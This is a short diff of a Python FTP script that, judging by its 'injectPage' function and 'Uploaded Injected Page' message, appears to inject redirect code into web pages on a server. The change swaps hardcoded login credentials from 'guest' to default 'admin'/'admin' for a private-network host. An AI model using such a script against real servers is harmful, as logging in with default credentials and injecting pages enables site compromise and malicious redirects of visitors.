@@ -13,8 +13,8 @@ def injectPage(ftp, page, redirect):
     print('[+] Uploaded Injected Page: ' + page)
 
 host = '192.168.0.1'
-username = 'guest'
-password = 'guest'
+username = 'admin'
+password = 'admin'
 
 ftp = ftplib.FTP(host)
 ftp.login(username, password)
